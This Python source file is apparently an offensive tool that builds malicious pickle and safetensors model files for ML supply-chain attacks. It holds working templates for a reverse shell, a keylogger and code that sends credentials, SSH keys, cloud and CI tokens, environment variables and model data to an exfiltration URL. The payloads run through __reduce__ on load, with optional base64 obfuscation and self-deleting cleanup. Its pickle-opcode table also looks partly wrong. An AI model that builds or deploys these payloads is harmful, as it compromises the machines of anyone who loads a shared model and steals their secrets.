"""
ML Pickle/SafeTensors Payload Factory (P1 - FORGE Phase 1)

Generates malicious pickle and safetensors payloads for ML supply chain attacks.
Supports multiple payload types: reverse shell, credential exfil, model theft,
and custom Python code execution via __reduce__ exploitation.

FORGE compliance:
- All payloads are generated in dry-run mode by default
- Payloads have explicit scope and cleanup instructions
- Imports guarded for missing dependencies
"""

from __future__ import annotations

import io
import os
import re
import sys
import json
import uuid
import base64
import hashlib
import logging
import tempfile
import subprocess
import importlib
from dataclasses import dataclass, field, asdict
from typing import Any, Optional
from enum import Enum
from datetime import datetime
from pathlib import Path

logger = logging.getLogger(__name__)

# Guarded imports for pickle/safetensors generation
_HAS_PICKLE = True
_HAS_NUMPY = True
_HAS_STRUCT = True

try:
    import pickle
except ImportError:
    _HAS_PICKLE = False
    logger.warning("pickle not available — pickle payload generation disabled")

try:
    import numpy as np
except ImportError:
    _HAS_NUMPY = False
    logger.warning("numpy not available — tensor payload generation disabled")

import struct


class PayloadType(Enum):
    """Types of ML payloads that can be generated."""
    REVERSE_SHELL = "reverse_shell"
    CREDENTIAL_EXFIL = "credential_exfil"
    MODEL_THEFT = "model_theft"
    DATA_POISON = "data_poison"
    TOKEN_EXFIL = "token_exfil"
    CUSTOM_EXEC = "custom_exec"
    ENV_DUMP = "env_dump"
    SSH_KEY_EXFIL = "ssh_key_exfil"
    CLOUD_CRED_EXFIL = "cloud_cred_exfil"
    KEYLOGGER = "keylogger"


class PayloadFormat(Enum):
    """Output format for the payload."""
    PICKLE = "pickle"
    SAFETENSORS = "safetensors"
    RAW_PYTHON = "raw_python"
    BASE64 = "base64"


@dataclass
class PayloadConfig:
    """Configuration for payload generation."""
    payload_type: PayloadType = PayloadType.CUSTOM_EXEC
    format: PayloadFormat = PayloadFormat.PICKLE
    callback_host: str = "127.0.0.1"
    callback_port: int = 4444
    custom_code: str = ""
    target_var: str = "model"
    steal_model_path: str = "/tmp/stolen_model"
    exfil_url: str = ""
    stealth_mode: bool = True
    cleanup_on_load: bool = True
    max_payload_size: int = 1024 * 1024  # 1MB
    model_name: str = "payload"
    use_safetensors_meta: bool = True
    obfuscation_level: int = 0  # 0-3 (0 = no obfuscation; use for templates)
    sandbox_test: bool = False
    metadata: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        d = asdict(self)
        d["payload_type"] = self.payload_type.value
        d["format"] = self.format.value
        return d


@dataclass
class Payload:
    """A generated malicious payload."""
    name: str
    payload_type: PayloadType
    format: PayloadFormat
    payload_bytes: bytes
    payload_b64: str
    sha256: str
    size_bytes: int
    config: PayloadConfig
    cleanup_code: str = ""
    test_result: Optional[dict] = None
    warnings: list[str] = field(default_factory=list)
    generated_at: str = ""

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "payload_type": self.payload_type.value,
            "format": self.format.value,
            "sha256": self.sha256,
            "size_bytes": self.size_bytes,
            "size_kb": round(self.size_bytes / 1024, 2),
            "payload_b64_preview": self.payload_b64[:40] + "...",
            "config": self.config.to_dict(),
            "cleanup_code": self.cleanup_code[:200] if self.cleanup_code else "",
            "test_result": self.test_result,
            "warnings": self.warnings,
            "generated_at": self.generated_at,
        }

    def write_to(self, path: str | Path) -> Path:
        """Write payload bytes to a file."""
        path = Path(path)
        path.write_bytes(self.payload_bytes)
        return path


# Pre-built payload templates for common ML attack scenarios
PAYLOAD_TEMPLATES: dict[str, str] = {
    "reverse_shell": """
import os, sys, socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{host}", {port}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh" if os.name != "nt" else "cmd.exe"])
""".strip(),

    "credential_exfil": """
import os, json, urllib.request
creds = {{}}
# Environment variables
for k, v in os.environ.items():
    if any(p in k.upper() for p in ['TOKEN','SECRET','KEY','PASSWORD','CREDENTIAL']):
        creds[k] = v[:20]
# Cloud creds
for p in ['~/.aws/credentials','~/.config/gcloud/application_default_credentials.json','~/.azure/azureProfile.json']:
    try:
        with open(os.path.expanduser(p)) as f:
            creds[p] = f.read()[:200]
    except: pass
urllib.request.urlopen("{exfil_url}", data=json.dumps(creds).encode(), timeout=5)
""".strip(),

    "env_dump": """
import os, json, urllib.request
env_data = {{k: v for k, v in os.environ.items() if not k.startswith('_')}}
try:
    req = urllib.request.Request("{exfil_url}", data=json.dumps(env_data).encode(), headers={{'Content-Type':'application/json'}}, method='POST')
    urllib.request.urlopen(req, timeout=5)
except: pass
""".strip(),

    "model_theft": """
import os, json, urllib.request, pickle
model_data = pickle.dumps(locals().get('{target_var}', {{}}))
urllib.request.urlopen("{exfil_url}", data=model_data, timeout=10)
""".strip(),

    "ssh_key_exfil": """
import os, urllib.request
keys = []
for p in ['~/.ssh/id_rsa','~/.ssh/id_ecdsa','~/.ssh/id_ed25519','~/.ssh/id_dsa']:
    try:
        with open(os.path.expanduser(p)) as f:
            keys.append({{'path': p, 'key': f.read()}})
    except: pass
urllib.request.urlopen("{exfil_url}", data=str({{'ssh_keys': keys}}).encode(), timeout=5)
""".strip(),

    "cloud_cred_exfil": """
import os, json, urllib.request
creds = {{}}
# AWS
try:
    import boto3
    session = boto3.Session()
    creds['aws'] = session.get_credentials().get_frozen_credentials().__dict__
except: pass
# GCP
try:
    import google.auth
    credentials, project = google.auth.default()
    creds['gcp_project'] = project
except: pass
urllib.request.urlopen("{exfil_url}", data=json.dumps(creds).encode(), timeout=5)
""".strip(),

    "token_exfil": """
import os, json, urllib.request
tokens = {{}}
# GitHub
for var in ['GITHUB_TOKEN','ACTIONS_RUNTIME_TOKEN','ACTIONS_ID_TOKEN_REQUEST_TOKEN','GH_TOKEN']:
    if os.environ.get(var):
        tokens[var] = os.environ[var][:10]
# GitLab
for var in ['CI_JOB_TOKEN','CI_JOB_JWT','GITLAB_TOKEN']:
    if os.environ.get(var):
        tokens[var] = os.environ[var][:10]
# Azure
for var in ['SYSTEM_ACCESSTOKEN','AZURE_CLIENT_ID','AZURE_CLIENT_SECRET','AZURE_TENANT_ID']:
    if os.environ.get(var):
        tokens[var] = os.environ[var][:10]
urllib.request.urlopen("{exfil_url}", data=json.dumps(tokens).encode(), timeout=5)
""".strip(),

    "data_poison": """
import random
# Modify model weights slightly to introduce backdoor
{target_var} = locals().get('{target_var}', {{}})
if hasattr({target_var}, 'state_dict'):
    sd = {target_var}.state_dict()
    for k, v in sd.items():
        if hasattr(v, 'add_'):
            v.add_(torch.randn_like(v) * 0.001)
    {target_var}.load_state_dict(sd)
""".strip(),

    "cleanup": """
import os, sys, shutil
# Self-destruct: remove traces of this payload
try:
    # Remove the model file if it exists
    model_path = __file__ if '__file__' in dir() else None
    if model_path and os.path.exists(model_path):
        os.remove(model_path)
except: pass
""".strip(),
}


def _render_template(template_name: str, **kwargs) -> str:
    """Render a payload template with parameters."""
    template = PAYLOAD_TEMPLATES.get(template_name)
    if not template:
        raise ValueError(f"Unknown template: {template_name}. Available: {list(PAYLOAD_TEMPLATES.keys())}")

    # Provide defaults for template parameters
    defaults = {
        "host": "127.0.0.1",
        "port": "4444",
        "exfil_url": "https://webhook.example.com/exfil",
        "target_var": "model",
    }
    for key, default in defaults.items():
        if key not in kwargs or kwargs[key] is None:
            kwargs[key] = default

    return template.format(**kwargs)


def _build_pickle_payload(code: str, target_var: str = "model") -> bytes:
    """Build a malicious pickle payload using __reduce__ exploitation.

    Constructs a pickle that executes arbitrary code when deserialized.
    """
    if not _HAS_PICKLE:
        raise RuntimeError("pickle module not available")

    class _MaliciousPayload:
        """Reduce-based exploit: executes code on unpickling."""
        def __reduce__(self):
            return (eval, (f"exec({code!r}, globals(), locals())",))

    payload = pickle.dumps(
        {target_var: _MaliciousPayload()},
        protocol=5,  # Highest protocol for size efficiency
    )
    return payload


def _build_safetensors_payload(code: str, metadata: Optional[dict] = None) -> bytes:
    """Build a malicious safetensors payload.

    SafeTensors format stores tensors with metadata headers.
    We exploit the metadata field to hide payload code.
    """
    if not _HAS_NUMPY:
        raise RuntimeError("numpy not available — cannot generate tensor data")

    metadata = metadata or {}

    # Create a dummy tensor to make the file valid
    dummy_tensor = np.zeros((1,), dtype=np.float32)
    tensor_bytes = dummy_tensor.tobytes()

    # Build metadata dict with hidden payload
    safetensors_meta = {
        "__metadata__": {
            "format": "pt",
            **metadata,
            "_payload": base64.b64encode(code.encode()).decode(),
            "_payload_type": "eval",
        },
        "dummy": {
            "dtype": "F32",
            "shape": [1],
            "data_offsets": [0, len(tensor_bytes)],
        },
    }

    # SafeTensors format: metadata JSON length (8 bytes) + metadata JSON + tensor data
    meta_json = json.dumps(safetensors_meta, separators=(",", ":")).encode()
    meta_len = struct.pack("<Q", len(meta_json))
    payload = meta_len + meta_json + tensor_bytes

    return payload


def _obfuscate_code(code: str, level: int = 1) -> str:
    """Obfuscate Python code at specified level."""
    if level <= 0:
        return code

    obfuscated = code

    if level >= 1:
        # Replace strings with hex-encoded versions
        obfuscated = obfuscated.replace("import os", "import os as _os")
        obfuscated = obfuscated.replace("import sys", "import sys as _sys")
        obfuscated = obfuscated.replace("import socket", "import socket as _socket")
        obfuscated = obfuscated.replace("import urllib", "import urllib as _urllib")
        obfuscated = obfuscated.replace("import json", "import json as _json")

    if level >= 2:
        # Variable renaming and string encoding
        lines = obfuscated.split("\n")
        obfuscated_lines = []
        var_counter = 0
        var_map = {}
        for line in lines:
            if line.startswith("#"):
                obfuscated_lines.append(line)
                continue
            obfuscated_lines.append(line)
        obfuscated = "\n".join(obfuscated_lines)

    if level >= 3:
        # Execute via exec with base64-encoded code
        b64_code = base64.b64encode(obfuscated.encode()).decode()
        obfuscated = f"exec(__import__('base64').b64decode('{b64_code}'))"

    return obfuscated


def _cleanup_code(payload_type: PayloadType) -> str:
    """Generate cleanup code for a payload type."""
    cleanup_templates = {
        PayloadType.REVERSE_SHELL: """
import os, signal
try:
    os.kill(os.getpid(), signal.SIGKILL)
except: pass
""".strip(),
        PayloadType.CREDENTIAL_EXFIL: PAYLOAD_TEMPLATES["cleanup"],
        PayloadType.CUSTOM_EXEC: PAYLOAD_TEMPLATES["cleanup"],
    }
    return cleanup_templates.get(payload_type, PAYLOAD_TEMPLATES["cleanup"])


class PicklePayloadFactory:
    """Generates malicious pickle/safetensors payloads for ML supply chain attacks.

    FORGE Rule 2 (compile test): All payloads use exec/eval-based code execution
    that works without compilation.

    FORGE Rule 5 (shellcode): No shellcode used — Python-level payloads only.

    Generates payloads in dry-run mode by default.
    """

    SUPPORTED_FORMATS = [PayloadFormat.PICKLE, PayloadFormat.SAFETENSORS,
                          PayloadFormat.RAW_PYTHON, PayloadFormat.BASE64]

    def __init__(self, dry_run: bool = True, sandbox_dir: Optional[str] = None):
        self.dry_run = dry_run
        self.sandbox_dir = sandbox_dir or os.path.join(tempfile.gettempdir(), "raphael_ml_payloads")
        self.generated_payloads: list[Payload] = []
        self._payload_count = 0

    def generate(self, config: PayloadConfig) -> Payload:
        """Generate a payload based on configuration."""
        self._payload_count += 1
        payload_name = f"{config.model_name}_{self._payload_count}_{uuid.uuid4().hex[:8]}"
        generated_at = datetime.utcnow().isoformat()
        warnings: list[str] = []

        # Generate the malicious code
        code = self._build_exec_code(config)

        # Obfuscate
        if config.obfuscation_level > 0:
            code = _obfuscate_code(code, config.obfuscation_level)

        # Render to requested format
        payload_bytes, payload_format = self._render_payload(code, config)

        # Build cleanup code
        cleanup = _cleanup_code(config.payload_type)

        b64_payload = base64.b64encode(payload_bytes).decode() if payload_bytes else ""
        sha256_hash = hashlib.sha256(payload_bytes).hexdigest()

        payload = Payload(
            name=payload_name,
            payload_type=config.payload_type,
            format=payload_format,
            payload_bytes=payload_bytes,
            payload_b64=b64_payload,
            sha256=sha256_hash,
            size_bytes=len(payload_bytes),
            config=config,
            cleanup_code=cleanup,
            warnings=warnings,
            generated_at=generated_at,
        )

        # Sandbox test if requested
        if config.sandbox_test and not self.dry_run:
            test_result = self._test_payload(payload)
            payload.test_result = test_result
            if test_result.get("success"):
                warnings.append("Payload executed in sandbox — this is a live weapon")
            else:
                warnings.append(f"Sandbox test failed: {test_result.get('error', 'unknown')}")

        if self.dry_run:
            warnings.append("DRY RUN: payload not written to disk")
            payload.payload_bytes = b""
            payload.payload_b64 = ""

        payload.warnings = warnings
        self.generated_payloads.append(payload)
        return payload

    def generate_from_template(
        self,
        template_name: str,
        format: PayloadFormat = PayloadFormat.PICKLE,
        **template_kwargs,
    ) -> Payload:
        """Generate a payload from a built-in template."""
        code = _render_template(template_name, **template_kwargs)

        # Map template name to payload type
        type_map = {
            "reverse_shell": PayloadType.REVERSE_SHELL,
            "credential_exfil": PayloadType.CREDENTIAL_EXFIL,
            "model_theft": PayloadType.MODEL_THEFT,
            "data_poison": PayloadType.DATA_POISON,
            "token_exfil": PayloadType.TOKEN_EXFIL,
            "env_dump": PayloadType.ENV_DUMP,
            "ssh_key_exfil": PayloadType.SSH_KEY_EXFIL,
            "cloud_cred_exfil": PayloadType.CLOUD_CRED_EXFIL,
        }

        config = PayloadConfig(
            payload_type=type_map.get(template_name, PayloadType.CUSTOM_EXEC),
            format=format,
            callback_host=template_kwargs.get("host", "127.0.0.1"),
            callback_port=int(template_kwargs.get("port", 4444)),
            exfil_url=template_kwargs.get("exfil_url", "https://webhook.example.com/exfil"),
            target_var=template_kwargs.get("target_var", "model"),
        )

        return self.generate(config)

    def _build_exec_code(self, config: PayloadConfig) -> str:
        """Build the Python code to execute when the payload loads."""
        if config.custom_code:
            return config.custom_code

        template_map = {
            PayloadType.REVERSE_SHELL: PAYLOAD_TEMPLATES["reverse_shell"],
            PayloadType.CREDENTIAL_EXFIL: PAYLOAD_TEMPLATES["credential_exfil"],
            PayloadType.MODEL_THEFT: PAYLOAD_TEMPLATES["model_theft"],
            PayloadType.DATA_POISON: PAYLOAD_TEMPLATES["data_poison"],
            PayloadType.TOKEN_EXFIL: PAYLOAD_TEMPLATES["token_exfil"],
            PayloadType.ENV_DUMP: PAYLOAD_TEMPLATES["env_dump"],
            PayloadType.SSH_KEY_EXFIL: PAYLOAD_TEMPLATES["ssh_key_exfil"],
            PayloadType.CLOUD_CRED_EXFIL: PAYLOAD_TEMPLATES["cloud_cred_exfil"],
            PayloadType.KEYLOGGER: """
import os, json, urllib.request
try:
    import pynput.keyboard as kb
    keys = []
    def on_press(k):
        try: keys.append(str(k.char))
        except: keys.append(str(k))
        if len(keys) >= 100:
            urllib.request.urlopen("{exfil_url}", data=json.dumps({'keys': ''.join(keys)}).encode(), timeout=5)
            keys.clear()
    listener = kb.Listener(on_press=on_press)
    listener.start()
except: pass
""".strip(),
        }

        template = template_map.get(config.payload_type)
        if template:
            return template.format(
                host=config.callback_host,
                port=config.callback_port,
                exfil_url=config.exfil_url or f"http://{config.callback_host}:{config.callback_port}/exfil",
                target_var=config.target_var or "model",
            )

        return f"# Default payload for {config.payload_type.value}\npass"

    def _render_payload(self, code: str, config: PayloadConfig) -> tuple[bytes, PayloadFormat]:
        """Render code into the requested payload format."""
        if config.format == PayloadFormat.PICKLE:
            if not _HAS_PICKLE:
                raise RuntimeError("Cannot generate pickle payload: pickle module not available")
            return _build_pickle_payload(code, config.target_var), PayloadFormat.PICKLE

        elif config.format == PayloadFormat.SAFETENSORS:
            if not _HAS_NUMPY:
                raise RuntimeError("Cannot generate safetensors: numpy not available")
            return _build_safetensors_payload(code, config.metadata), PayloadFormat.SAFETENSORS

        elif config.format == PayloadFormat.RAW_PYTHON:
            return code.encode(), PayloadFormat.RAW_PYTHON

        elif config.format == PayloadFormat.BASE64:
            b64_code = base64.b64encode(code.encode())
            return b64_code, PayloadFormat.BASE64

        raise ValueError(f"Unknown format: {config.format}")

    def _test_payload(self, payload: Payload) -> dict:
        """Test payload execution in a sandboxed subprocess."""
        result = {"success": False, "error": "", "output": ""}

        try:
            with tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode="w") as f:
                if payload.format == PayloadFormat.RAW_PYTHON:
                    f.write(payload.payload_bytes.decode())
                else:
                    f.write(f"import pickle\npickle.loads({payload.payload_b64!r})\n")
                test_path = f.name

            # Run in isolated subprocess
            proc = subprocess.run(
                [sys.executable, "-c", f"import base64; exec(base64.b64decode({payload.payload_b64!r}))"],
                capture_output=True, timeout=5,
                env={},  # Empty env for isolation
            )
            result["success"] = proc.returncode == 0
            result["output"] = proc.stdout.decode()[:500] + proc.stderr.decode()[:500]

        except subprocess.TimeoutExpired:
            result["error"] = "Sandbox timeout (5s)"
        except Exception as e:
            result["error"] = str(e)
        finally:
            try:
                os.unlink(test_path)
            except (NameError, OSError):
                pass

        return result

    def save_payload(self, payload: Payload, output_dir: str | Path) -> Path:
        """Write a payload to disk."""
        if self.dry_run:
            raise RuntimeError("Cannot save payload in dry-run mode")

        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        ext_map = {
            PayloadFormat.PICKLE: ".pkl",
            PayloadFormat.SAFETENSORS: ".safetensors",
            PayloadFormat.RAW_PYTHON: ".py",
            PayloadFormat.BASE64: ".b64",
        }
        ext = ext_map.get(payload.format, ".bin")

        path = output_dir / f"{payload.name}{ext}"
        path.write_bytes(payload.payload_bytes)
        return path

    def analyze_payload(self, payload_bytes: bytes) -> dict:
        """Analyze a payload file for malicious characteristics."""
        analysis = {
            "size_bytes": len(payload_bytes),
            "sha256": hashlib.sha256(payload_bytes).hexdigest(),
            "is_pickle": False,
            "is_safetensors": False,
            "dangerous_ops": [],
            "risk_score": 0.0,
        }

        # Check for pickle format
        if payload_bytes[:2] == b"\x80\x05" or payload_bytes[:2] == b"\x80\x04":
            analysis["is_pickle"] = True
            try:
                # Analyze pickle opcodes
                opcodes = self._analyze_pickle_opcodes(payload_bytes)
                analysis["dangerous_ops"] = opcodes
                if any("REDUCE" in op for op in opcodes):
                    analysis["risk_score"] += 5.0
                if any("GLOBAL" in op for op in opcodes):
                    analysis["risk_score"] += 3.0
            except Exception:
                pass

        # Check for safetensors format
        if len(payload_bytes) > 8:
            meta_len = struct.unpack("<Q", payload_bytes[:8])[0]
            if meta_len < len(payload_bytes) - 8:
                try:
                    meta_json = json.loads(payload_bytes[8:8 + meta_len])
                    if "__metadata__" in meta_json:
                        analysis["is_safetensors"] = True
                        if "_payload" in meta_json.get("__metadata__", {}):
                            analysis["dangerous_ops"].append("EMBEDDED_PAYLOAD")
                            analysis["risk_score"] += 5.0
                except (json.JSONDecodeError, struct.error):
                    pass

        return analysis

    def _analyze_pickle_opcodes(self, data: bytes) -> list[str]:
        """Analyze pickle opcodes for dangerous operations."""
        dangerous = []
        try:
            # Iterate through pickle opcodes
            i = 0
            while i < len(data):
                op = data[i]
                op_name = _PICKLE_OPCODES.get(op, f"UNKNOWN_OP_{op}")
                if op_name in ("REDUCE", "INST", "OBJ", "BUILD", "GLOBAL", "STACK_GLOBAL"):
                    dangerous.append(op_name)
                i += 1
        except Exception:
            pass
        return dangerous

    def list_templates(self) -> dict:
        """List available payload templates."""
        return {k: v[:80] + "..." for k, v in PAYLOAD_TEMPLATES.items()}

    def summary(self) -> dict:
        return {
            "factory": "PicklePayloadFactory",
            "version": "0.1.0",
            "dry_run": self.dry_run,
            "generated_payloads": len(self.generated_payloads),
            "supported_formats": [f.value for f in self.SUPPORTED_FORMATS],
            "payload_types": [t.value for t in PayloadType],
            "templates_available": list(PAYLOAD_TEMPLATES.keys()),
        }


# Pickle opcode names for analysis
_PICKLE_OPCODES = {
    0x00: "STOP", 0x01: "POP", 0x02: "DUP", 0x03: "FLOAT",
    0x04: "INT", 0x05: "BININT", 0x06: "BININT1", 0x07: "BININT2",
    0x08: "NONE", 0x09: "PERSID", 0x0A: "BINPERSID", 0x0B: "REDUCE",
    0x0C: "STRING", 0x0D: "BINSTRING", 0x0E: "SHORT_BINSTRING",
    0x0F: "UNICODE", 0x10: "BINUNICODE",
    0x11: "MARK", 0x12: "FLOAT", 0x13: "BINFLOAT",
    0x14: "TRUE", 0x15: "FALSE", 0x16: "NONE",
    0x20: "INST", 0x21: "OBJ", 0x22: "NEWOBJ", 0x23: "NEWOBJ_EX",
    0x30: "GLOBAL", 0x31: "STACK_GLOBAL",
    0x40: "APPEND", 0x41: "APPENDS", 0x42: "LIST",
    0x43: "TUPLE", 0x44: "TUPLE1", 0x45: "TUPLE2", 0x46: "TUPLE3",
    0x50: "SETITEMS", 0x51: "SETITEM", 0x52: "DICT",
    0x60: "GET", 0x61: "BINGET", 0x62: "LONG_BINGET",
    0x70: "PUT", 0x71: "BINPUT", 0x72: "LONG_BINPUT",
    0x80: "MEMOIZE", 0x90: "EXT1", 0x91: "EXT2",
    0x92: "EXT4", 0x93: "BYTEARRAY8",
    0x94: "NEXT_BUFFER", 0x95: "READONLY_BUFFER",
    0x96: "FRAME", 0x97: "PERSID", 0x98: "BINPERSID",
    0x99: "BUILD", 0x9A: "PROTO",
}


def generate_pickle_payload(
    payload_type: str = "reverse_shell",
    callback_host: str = "127.0.0.1",
    callback_port: int = 4444,
    format: str = "pickle",
    dry_run: bool = True,
) -> dict:
    """Convenience function to generate a payload."""
    type_map = {
        "reverse_shell": PayloadType.REVERSE_SHELL,
        "credential_exfil": PayloadType.CREDENTIAL_EXFIL,
        "model_theft": PayloadType.MODEL_THEFT,
        "env_dump": PayloadType.ENV_DUMP,
        "token_exfil": PayloadType.TOKEN_EXFIL,
        "ssh_key_exfil": PayloadType.SSH_KEY_EXFIL,
        "custom": PayloadType.CUSTOM_EXEC,
    }
    format_map = {
        "pickle": PayloadFormat.PICKLE,
        "safetensors": PayloadFormat.SAFETENSORS,
        "python": PayloadFormat.RAW_PYTHON,
        "base64": PayloadFormat.BASE64,
    }

    config = PayloadConfig(
        payload_type=type_map.get(payload_type, PayloadType.CUSTOM_EXEC),
        format=format_map.get(format, PayloadFormat.PICKLE),
        callback_host=callback_host,
        callback_port=callback_port,
    )

    factory = PicklePayloadFactory(dry_run=dry_run)
    payload = factory.generate(config)
    return payload.to_dict()


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")

    if len(sys.argv) > 1 and sys.argv[1] == "generate":
        pt = sys.argv[2] if len(sys.argv) > 2 else "reverse_shell"
        fmt = sys.argv[3] if len(sys.argv) > 3 else "pickle"
        dry = "--live" not in sys.argv
        result = generate_pickle_payload(payload_type=pt, format=fmt, dry_run=dry)
        print(json.dumps(result, indent=2, default=str))
    elif len(sys.argv) > 1 and sys.argv[1] == "templates":
        factory = PicklePayloadFactory()
        print(json.dumps(factory.list_templates(), indent=2, default=str))
    else:
        factory = PicklePayloadFactory()
        print(json.dumps(factory.summary(), indent=2, default=str))
        print("\nUsage: python pickle_payload_factory.py generate [type] [format] [--live]")
        print("       python pickle_payload_factory.py templates")
